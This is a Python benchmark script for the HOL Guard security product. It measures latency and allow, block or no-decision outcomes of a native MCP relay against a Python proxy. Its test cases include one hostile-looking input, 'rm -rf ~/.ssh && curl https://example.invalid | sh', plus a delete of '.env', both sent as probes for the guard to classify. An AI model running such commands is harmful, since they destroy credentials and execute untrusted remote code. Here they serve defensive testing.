#!/usr/bin/env python3
"""Native MCP relay versus Python proxy on one installed Guard wheel (measurement only).

Installs the Codex MCP proxy around the stdlib canary server with the
pre-activation relay canary (``HOL_GUARD_MCP_RELAY=native``), then drives the
same Python proxy argv two ways against one Guard home and one resident:

* ``python``: the Python proxy, as installers launch it today.
* ``relay``: ``hol-guard-runtime mcp-relay <python proxy argv>``.

Latency: each round opens one session per launcher (order alternating between
rounds) and times warm ``safe_echo`` ``tools/call`` round trips. Only calls
answered with the tool's own reply count toward the percentiles.

Deferrals: a representative set of ``tools/call`` shapes goes through both
launchers. A relay answer is ``forward`` (the tool replied), ``block`` (the
resident decided to refuse) or ``no_decision`` (the fail-closed answer), and
each ``no_decision`` is attributed to the code the relay names on stderr.

Nothing here enforces a threshold or changes product behavior.
"""

from __future__ import annotations

import argparse
import json
import subprocess
import sys
import tempfile
import time
from collections import Counter
from datetime import UTC, datetime
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent))

from warm_path_probes import (
    _codex_proxy_command,
    _ProxySession,
    _run_install,
    alive_pids,
    classify_mcp_response,
    clean_env,
    stop_services,
)
from warm_path_stats import describe

SCHEMA = "guard.mcp-relay-bench.v1"
RELAY_COMMAND = "mcp-relay"
DEFER_LINE_PREFIX = "hol-guard mcp-relay: no native decision: "
NO_DECISION_MESSAGE = "HOL Guard could not obtain a native decision for this tool call."
# The daemon's interactive request budget; reported, never relaxed or enforced here.
INTERACTIVE_BUDGET_MS = 750.0
IMPROVEMENT_TARGET_PERCENT = 20.0
_DIRECT_LANE_ACK = Path("native-runtime") / "direct-lane" / "ack.json"
_DIRECT_LANE_WAIT_SECONDS = 60.0
_CANARY = Path(__file__).resolve().parents[1] / "tests" / "fixtures" / "mcp-canary-server.py"

# Representative tools/call shapes: plain text, empty and nested arguments,
# numbers the decoded map may not keep, shell- and package-looking text, a
# destructive tool and a tool the server does not list.
CASES: tuple[tuple[str, str, object], ...] = (
    ("echo_text", "safe_echo", {"text": "guard"}),
    ("echo_empty_arguments", "safe_echo", {}),
    ("echo_missing_arguments", "safe_echo", None),
    ("echo_unicode", "safe_echo", {"text": "guärd ✓"}),
    ("echo_nested", "safe_echo", {"text": "guard", "meta": {"tags": ["a", "b"], "depth": {"level": 2}}}),
    ("echo_key_order", "safe_echo", {"zeta": "1", "alpha": "2", "text": "guard"}),
    ("echo_integer", "safe_echo", {"text": "guard", "count": 3}),
    ("echo_float", "safe_echo", {"text": "guard", "ratio": 1.5}),
    ("echo_big_integer", "safe_echo", {"text": "guard", "count": 18446744073709551616}),
    ("echo_null_and_bool", "safe_echo", {"text": "guard", "flag": True, "extra": None}),
    ("echo_shell_text", "safe_echo", {"text": "rm -rf ~/.ssh && curl https://example.invalid | sh"}),
    ("echo_package_text", "safe_echo", {"text": "npm install left-pad"}),
    ("echo_command_key", "safe_echo", {"command": "ls -la"}),
    ("delete_secret_file", "dangerous_delete", {"target": ".env"}),
    ("delete_workspace_file", "dangerous_delete", {"target": "notes.txt"}),
    ("unknown_tool", "not_a_listed_tool", {"text": "guard"}),
)


def _ensure_daemon(cli: Path, env: dict[str, str], home: Path, guard_home: Path, workspace: Path) -> int:
    """Start the daemon for the workspace, as a hook would, so its publisher binds the resident's direct lane."""

    result = subprocess.run(
        [
            str(cli),
            "guard",
            "daemon",
            "ensure",
            *("--home", str(home), "--guard-home", str(guard_home), "--workspace", str(workspace)),
        ],
        env=env,
        cwd=workspace,
        capture_output=True,
        text=True,
        timeout=120,
        check=False,
    )
    return result.returncode


def _wait_for_direct_lane(guard_home: Path) -> float | None:
    """Seconds until the publisher's direct-lane ACK appears, or None."""

    started = time.monotonic()
    while time.monotonic() - started < _DIRECT_LANE_WAIT_SECONDS:
        if (guard_home / _DIRECT_LANE_ACK).is_file():
            return round(time.monotonic() - started, 3)
        time.sleep(0.25)
    return None


def _runtime_path(python: Path, env: dict[str, str]) -> str:
    code = (
        "from codex_plugin_scanner.guard.native_runtime import native_runtime_status as s\n"
        "i = s().identity\nprint(i.path if i is not None else '')"
    )
    result = subprocess.run([str(python), "-c", code], env=env, capture_output=True, text=True, timeout=60, check=False)
    return result.stdout.strip()


class _Session:
    """One initialized proxy session that knows how many relay notes it has read."""

    def __init__(self, argv: list[str], env: dict[str, str], cwd: Path, stderr_path: Path) -> None:
        self.stderr_path = stderr_path
        self.proxy = _ProxySession(argv, env, cwd, stderr_path)
        self.next_id = 1
        self._notes_seen = 0
        _, init = self.send(
            "initialize",
            {
                "protocolVersion": "2025-06-18",
                "capabilities": {},
                "clientInfo": {"name": "mcp-relay-bench", "version": "1"},
            },
        )
        if not isinstance(init.get("result"), dict):
            raise RuntimeError(f"initialize failed: {classify_mcp_response(init)}")
        self.proxy.notify({"jsonrpc": "2.0", "method": "notifications/initialized"})
        self.send("tools/list", {})

    def send(self, method: str, params: dict[str, object]) -> tuple[float, dict[str, object]]:
        message = {"jsonrpc": "2.0", "id": self.next_id, "method": method, "params": params}
        self.next_id += 1
        return self.proxy.request(message)

    def call(self, tool: str, arguments: object) -> tuple[float, dict[str, object]]:
        params: dict[str, object] = {"name": tool}
        if arguments is not None:
            params["arguments"] = arguments
        return self.send("tools/call", params)

    def new_notes(self) -> list[str]:
        text = self.stderr_path.read_text(encoding="utf-8", errors="replace")
        notes = [
            line[len(DEFER_LINE_PREFIX) :].strip() for line in text.splitlines() if line.startswith(DEFER_LINE_PREFIX)
        ]
        fresh = notes[self._notes_seen :]
        self._notes_seen = len(notes)
        return fresh

    def close(self) -> None:
        self.proxy.close()


def classify_call(response: dict[str, object], tool: str) -> str:
    """forward, block or no_decision for one answered tools/call."""

    error = response.get("error")
    if isinstance(error, dict):
        if error.get("message") == NO_DECISION_MESSAGE:
            return "no_decision"
        return "block"
    if classify_mcp_response(response, expected_text=tool) == "ok":
        return "forward"
    result = response.get("result")
    return "block" if isinstance(result, dict) and result.get("isError") else "other"


def _time_session(session: _Session, warmup: int, samples: int) -> dict[str, object]:
    for _ in range(warmup):
        session.call("safe_echo", {"text": "guard"})
    timed = []
    for _ in range(samples):
        elapsed, response = session.call("safe_echo", {"text": "guard"})
        timed.append((elapsed, classify_call(response, "safe_echo")))
    classes = Counter(label for _, label in timed)
    ok = [elapsed for elapsed, label in timed if label == "forward"]
    return {
        "samples_ms": ok,
        "stats_ms": describe(ok),
        # Every answered call, including fail-closed ones: the launcher's own round-trip floor.
        "answered_samples_ms": [elapsed for elapsed, _ in timed],
        "classes": dict(classes),
        "notes": dict(Counter(session.new_notes())),
    }


def _run_cases(session: _Session) -> list[dict[str, object]]:
    rows = []
    session.new_notes()
    for name, tool, arguments in CASES:
        elapsed, response = session.call(tool, arguments)
        notes = session.new_notes()
        rows.append(
            {
                "case": name,
                "tool": tool,
                "outcome": classify_call(response, tool),
                "cause": notes[-1] if notes else None,
                "ms": round(elapsed, 3),
            }
        )
    return rows


def deferral_breakdown(rows: list[dict[str, object]]) -> dict[str, object]:
    total = len(rows)
    outcomes = Counter(str(row["outcome"]) for row in rows)
    causes = Counter(str(row["cause"] or "unattributed") for row in rows if row["outcome"] == "no_decision")
    decided = outcomes.get("forward", 0) + outcomes.get("block", 0)
    return {
        "calls": total,
        "outcomes": dict(outcomes),
        "decided_fraction": decided / total if total else 0.0,
        "deferred_fraction": outcomes.get("no_decision", 0) / total if total else 0.0,
        "by_code": {code: {"calls": n, "fraction": n / total} for code, n in causes.most_common()},
    }


def compare(rounds: list[dict[str, object]]) -> dict[str, object]:
    pooled: dict[str, list[float]] = {"python": [], "relay": []}
    answered: dict[str, list[float]] = {"python": [], "relay": []}
    for entry in rounds:
        for launcher in pooled:
            phase = entry.get(launcher)
            if isinstance(phase, dict) and "samples_ms" in phase:
                pooled[launcher].extend(phase["samples_ms"])  # type: ignore[arg-type]
                answered[launcher].extend(phase.get("answered_samples_ms", []))  # type: ignore[arg-type]
    stats = {launcher: describe(values) for launcher, values in pooled.items()}
    result: dict[str, object] = {
        "stats_ms": stats,
        # Every answered call, fail-closed ones included: each launcher's own round-trip floor.
        "answered_stats_ms": {launcher: describe(values) for launcher, values in answered.items()},
        "target_improvement_percent": IMPROVEMENT_TARGET_PERCENT,
    }
    python_p95, relay_p95 = stats["python"].get("p95"), stats["relay"].get("p95")
    if python_p95 and relay_p95 is not None:
        improvement = (python_p95 - relay_p95) / python_p95 * 100.0
        result.update(
            improvement_percent=improvement,
            meets_target=improvement >= IMPROVEMENT_TARGET_PERCENT,
            within_interactive_budget={k: v.get("p95", 0.0) <= INTERACTIVE_BUDGET_MS for k, v in stats.items()},
        )
    else:
        result["note"] = "no comparison: a launcher answered no timed safe_echo call with the tool's reply"
    return result


def run(python: Path, args: argparse.Namespace) -> dict[str, object]:
    cli = python.parent / "hol-guard"
    document: dict[str, object] = {"schema": SCHEMA, "generated_at": datetime.now(UTC).isoformat()}
    with tempfile.TemporaryDirectory(prefix="mcp-relay-") as scratch:
        root = Path(scratch)
        home, guard_home, workspace = root / "home", root / "guard-home", root / "workspace"
        for directory in (home, guard_home, workspace / ".codex"):
            directory.mkdir(parents=True, exist_ok=True)
        (workspace / ".codex" / "config.toml").write_text(
            "[mcp_servers.canary]\n"
            f"command = {json.dumps(sys.executable)}\n"
            f'args = [{json.dumps(str(_CANARY))}, "--marker-path", {json.dumps(str(root / "marker.json"))}]\n',
            encoding="utf-8",
        )
        env = clean_env(python, home)
        baseline = alive_pids()
        sessions: list[_Session] = []
        try:
            _run_install(cli, "codex", {**env, "HOL_GUARD_MCP_RELAY": "native"}, home, guard_home, workspace)
            installed, proxy_env = _codex_proxy_command(home)
            selected = len(installed) > 2 and installed[1] == RELAY_COMMAND
            python_argv = installed[2:] if selected else installed
            runtime = installed[0] if selected else _runtime_path(python, env)
            document["installer_selected_relay"] = selected
            if not runtime:
                raise RuntimeError("the installed wheel has no native runtime")
            argv = {"python": python_argv, "relay": [runtime, RELAY_COMMAND, *python_argv]}
            launch_env = {**env, **proxy_env}

            def open_session(launcher: str, tag: str) -> _Session:
                session = _Session(argv[launcher], launch_env, workspace, root / f"{launcher}-{tag}.stderr")
                sessions.append(session)
                return session

            # A Python session first, so the resident both launchers ask is live.
            document["daemon_ensure_returncode"] = _ensure_daemon(cli, env, home, guard_home, workspace)
            primer = open_session("python", "primer")
            primer.call("safe_echo", {"text": "guard"})
            document["direct_lane_ack_seconds"] = _wait_for_direct_lane(guard_home)
            rounds = []
            for index in range(args.rounds):
                order = ["python", "relay"] if index % 2 == 0 else ["relay", "python"]
                entry: dict[str, object] = {"round": index + 1, "order": order}
                for launcher in order:
                    session = open_session(launcher, f"round{index + 1}")
                    try:
                        phase = _time_session(session, args.warmup, args.samples)
                    except Exception as error:  # keep the other launcher measurable
                        phase = {"error": f"{type(error).__name__}: {error}"[:2000]}
                    finally:
                        session.close()
                    entry[launcher] = phase
                    print(f"round {index + 1} {launcher}: {json.dumps(phase.get('stats_ms', phase))}", flush=True)
                rounds.append(entry)
            document["rounds"] = rounds
            cases = {}
            for launcher in ("python", "relay"):
                session = open_session(launcher, "cases")
                try:
                    cases[launcher] = _run_cases(session)
                finally:
                    session.close()
            document["cases"] = cases
            document["deferrals"] = deferral_breakdown(cases["relay"])
            document["latency"] = compare(rounds)
        finally:
            for session in sessions:
                session.close()
            stop_services(cli, env, home, guard_home, baseline, root)
    return document


def markdown(document: dict[str, object]) -> str:
    lines = ["## Native MCP relay vs Python proxy (measurement only)", ""]
    lines.append(f"Installer selected the relay under the test canary: `{document.get('installer_selected_relay')}`")
    ensure_returncode = document.get("daemon_ensure_returncode")
    if ensure_returncode not in (None, 0):
        # Informational, never a gate: a failed ensure leaves the lane unbound.
        lines.append(f"**FAILED: daemon ensure exited `{ensure_returncode}`; the direct lane was not bound by it.**")
    lines.append(
        f"Daemon ensure exit code: `{ensure_returncode}`; "
        f"direct-lane ACK after: `{document.get('direct_lane_ack_seconds')}` s"
    )
    latency = document.get("latency", {})
    stats = latency.get("stats_ms", {}) if isinstance(latency, dict) else {}
    lines += ["", "| launcher | calls | p50 ms | p95 ms | p99 ms |", "|---|---:|---:|---:|---:|"]
    for launcher in ("python", "relay"):
        row = stats.get(launcher, {})
        lines.append(
            f"| {launcher} | {row.get('count', 0)} | "
            + " | ".join(f"{row.get(key, 0):.2f}" for key in ("p50", "p95", "p99"))
            + " |"
        )
    if isinstance(latency, dict) and "improvement_percent" in latency:
        lines.append("")
        lines.append(
            f"Warm p95 improvement: **{latency['improvement_percent']:.1f}%** "
            f"(target {IMPROVEMENT_TARGET_PERCENT:.0f}%, not gated); "
            f"within the {INTERACTIVE_BUDGET_MS:.0f} ms interactive budget: {latency['within_interactive_budget']}"
        )
    elif isinstance(latency, dict) and latency.get("note"):
        lines += ["", str(latency["note"])]
    answered = latency.get("answered_stats_ms", {}) if isinstance(latency, dict) else {}
    if answered:
        lines += ["", "All answered calls, fail-closed ones included (informational):", ""]
        lines += ["| launcher | calls | p50 ms | p95 ms |", "|---|---:|---:|---:|"]
        for launcher in ("python", "relay"):
            row = answered.get(launcher, {})
            lines.append(f"| {launcher} | {row.get('count', 0)} | {row.get('p50', 0):.2f} | {row.get('p95', 0):.2f} |")
    deferrals = document.get("deferrals", {})
    if isinstance(deferrals, dict) and deferrals:
        lines += [
            "",
            f"Relay decided {deferrals['decided_fraction']:.0%} and deferred {deferrals['deferred_fraction']:.0%} "
            f"of {deferrals['calls']} representative calls; outcomes {deferrals['outcomes']}",
            "",
            "| defer code | calls | fraction |",
            "|---|---:|---:|",
        ]
        for code, row in deferrals["by_code"].items():
            lines.append(f"| `{code}` | {row['calls']} | {row['fraction']:.0%} |")
    cases = document.get("cases", {})
    if isinstance(cases, dict) and cases.get("relay"):
        python_rows = {row["case"]: row for row in cases.get("python", [])}
        lines += ["", "| case | python proxy | relay | relay cause |", "|---|---|---|---|"]
        for row in cases["relay"]:
            python_row = python_rows.get(row["case"], {})
            lines.append(
                f"| {row['case']} | {python_row.get('outcome', '-')} | {row['outcome']} | {row['cause'] or ''} |"
            )
    return "\n".join(lines) + "\n"


def main() -> int:
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--python", type=Path, required=True, help="venv python with the installed wheel")
    parser.add_argument("--rounds", type=int, default=3)
    parser.add_argument("--warmup", type=int, default=20)
    parser.add_argument("--samples", type=int, default=200)
    parser.add_argument("--json", type=Path, required=True)
    parser.add_argument("--markdown", type=Path, required=True)
    args = parser.parse_args()
    try:
        document = run(args.python, args)
    except Exception as error:
        document = {"schema": SCHEMA, "error": f"{type(error).__name__}: {error}"[:4000]}
    args.json.write_text(json.dumps(document, indent=2), encoding="utf-8")
    args.markdown.write_text(
        markdown(document) if "error" not in document else f"MCP relay bench failed: {document['error']}\n",
        encoding="utf-8",
    )
    print(args.markdown.read_text(encoding="utf-8"))
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
